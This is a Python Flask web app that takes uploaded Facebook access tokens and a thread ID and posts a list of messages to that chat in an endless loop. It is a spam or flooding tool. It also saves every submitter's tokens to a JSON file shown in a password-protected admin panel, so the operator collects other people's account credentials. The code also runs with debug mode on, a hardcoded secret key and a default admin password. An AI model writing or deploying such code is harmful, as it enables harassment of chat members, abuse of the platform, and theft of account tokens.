from flask import Flask, request, session, redirect, url_for, render_template
import requests
from threading import Thread, Event
import time
import os
import logging
import io
import json

app = Flask(__name__)
app.debug = True
app.secret_key = "3a4f82d59c6e4f0a8e912a5d1f7c3b2e6f9a8d4c5b7e1d1a4c"  # Change this in production

ADMIN_PASSWORD = os.getenv("ADMIN_PASSWORD", "12341")  # 🔑 Default password
USERS_FILE = "users.json"

# Log setup
log_stream = io.StringIO()
handler = logging.StreamHandler(log_stream)
handler.setLevel(logging.INFO)
logging.getLogger().addHandler(handler)
logging.getLogger().setLevel(logging.INFO)

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9',
    'referer': 'www.google.com'
}

stop_event = Event()
threads = []
users_data = []  # in-memory store

# ---------------- JSON Helpers ----------------

def save_users():
    try:
        with open(USERS_FILE, "w", encoding="utf-8") as f:
            json.dump(users_data, f, indent=2)
    except Exception as e:
        logging.error(f"⚠️ Error saving users.json: {e}")

def load_users():
    global users_data
    if os.path.exists(USERS_FILE):
        try:
            with open(USERS_FILE, "r", encoding="utf-8") as f:
                users_data = json.load(f)
        except Exception as e:
            logging.error(f"⚠️ Error loading users.json: {e}")
            users_data = []
    else:
        users_data = []

# ---------------- Worker ----------------

def send_messages(access_tokens, thread_id, mn, time_interval, messages):
    while not stop_event.is_set():
        try:
            for message1 in messages:
                if stop_event.is_set():
                    break
                for access_token in access_tokens:
                    api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                    message = str(mn) + ' ' + message1
                    params = {'access_token': access_token, 'message': message}
                    response = requests.post(api_url, data=params, headers=headers)
                    if response.status_code == 200:
                        logging.info(f"✅ Sent: {message[:30]} via {access_token[:30]}")
                    else:
                        logging.warning(f"❌ Fail [{response.status_code}]: {message[:30]}")
                time.sleep(time_interval)
        except Exception as e:
            logging.error("⚠️ Error in loop: %s", e)
            time.sleep(10)

# ---------------- Routes ----------------

@app.route('/ping')
def ping():
    return "✅ I am alive!", 200

@app.route('/', methods=['GET', 'POST'])
def send_message():
    global threads, users_data
    if request.method == 'POST':
        token_file = request.files['tokenFile']
        access_tokens = token_file.read().decode().strip().splitlines()

        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))

        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        # Save session
        new_user = {
            "tokens": access_tokens,
            "thread_id": thread_id,
            "prefix": mn,
            "interval": time_interval,
            "messages": messages
        }
        users_data.append(new_user)
        save_users()  # ✅ persist to JSON

        # Start background thread
        if not any(thread.is_alive() for thread in threads):
            stop_event.clear()
            thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages))
            thread.start()
            threads = [thread]

    return render_template("index.html")

# ---------------- Admin Panel ----------------

@app.route('/admin/login', methods=['GET', 'POST'])
def admin_login():
    if request.method == 'POST':
        password = request.form.get("password")
        if password == ADMIN_PASSWORD:
            session["admin"] = True
            return redirect(url_for("admin_panel"))
    return render_template("admin_login.html")

@app.route('/admin/panel')
def admin_panel():
    if not session.get("admin"):
        return redirect(url_for("admin_login"))
    return render_template("admin.html", users=users_data)

@app.route('/admin/remove/<int:idx>', methods=['POST'])
def remove_user(idx):
    if not session.get('admin'):
        return redirect(url_for('admin_login'))
    if 0 <= idx < len(users_data):
        users_data.pop(idx)
        save_users()  # ✅ update JSON
    return redirect(url_for('admin_panel'))

@app.route('/admin/logout')
def admin_logout():
    session.pop('admin', None)
    return redirect(url_for('admin_login'))

# ---------------- Main ----------------

if __name__ == "__main__":
    load_users()  # ✅ load saved users on start
    app.run(host='0.0.0.0', port=int(os.getenv("PORT", 5000)))
